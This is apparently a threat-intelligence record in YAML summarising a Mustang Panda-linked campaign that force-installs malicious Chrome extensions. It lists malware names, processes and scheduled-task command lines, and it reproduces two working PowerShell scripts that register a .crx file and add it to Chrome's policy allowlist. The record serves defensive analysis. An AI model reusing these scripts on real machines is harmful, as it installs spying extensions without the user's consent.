title: 'Decoy Docs and Malicious Browser Extensions: A Closer Look at a Multi-Layered
  Threat'
description: A threat actor, linked to Mustang Panda, uses scheduled tasks and PowerShell
  scripts to install malicious Chrome extensions by directly modifying the Windows
  Registry, bypassing normal extension installation methods. The extensions are adaptations
  of the open-source Extension-Code-Injector project and communicate with a C2 server
  for keylogging, command execution, and data exfiltration.
attribution: Mustang Panda
malware_families:
- protect_distribution.exe
- browser-extension.crx
- xl_ext_chrome.crx
- Acrobat.exe
- Cobalt Strike
cves: []
ttps:
  processes:
  - protect_distribution.exe
  - powershell.exe
  - taskeng.exe
  - Acrobat.exe
  - schtasks.exe
  command_lines:
  - schtasks /delete /tn ModifyRegistryTask1 /f
  - schtasks /delete /tn ModifyRegistryTask2 /f
  - schtasks /create /tn ModifyRegistryTask1 /tr "powershell.exe -ExecutionPolicy
    Bypass -File C:\Windows\Temp\ModifyRegistry1.ps1" /sc once /st 05:04 /rl highest
  - taskeng.exe {35C46379-7A58-4E6D-98CE-D88526114140} S-1-5-21-3294248377-1418901787-4083263181-1000:FMEDFXFE\Admin:Interactive:[1]
  powershell:
  - '$regPath = ''HKCU:\Software\Google\Chrome\Extensions\gomlcolffbhbcmcpofdnlhpadnigikjk''

    $regPathValueName = ''path''

    $regPathData = ''C:\Users\Admin\AppData\Local\ChromeExtensionCache\xl_ext_chrome.crx''

    $regVersionValueName = ''version''

    $regVersionData = ''1.0''

    if (-not (Test-Path $regPath)) {

    New-Item -Path $regPath -Force}

    Set-ItemProperty -Path $regPath -Name $regPathValueName -Value $regPathData

    Set-ItemProperty -Path $regPath -Name $regVersionValueName -Value $regVersionData

    Add-Content -Path "C:\Windows\Temp\ModifyRegistryLog.txt" -Value "The script has
    been executed successfully and the registry has been modified: $(Get-Date)"'
  - '$regPath2 = ''HKCU:\Software\Policies\Google\Chrome\ExtensionInstallAllowlist''

    $regValueName2 = ''1''

    $regData2 = ''gomlcolffbhbcmcpofdnlhpadnigikjk''

    if (-not (Test-Path $regPath2)) {

    New-Item -Path $regPath2 -Force}

    Set-ItemProperty -Path $regPath2 -Name $regValueName2 -Value $regData2

    Add-Content -Path "C:\Windows\Temp\ModifyRegistryLog.txt" -Value "The script has
    been executed successfully and the registry has been modified: $(Get-Date)"'
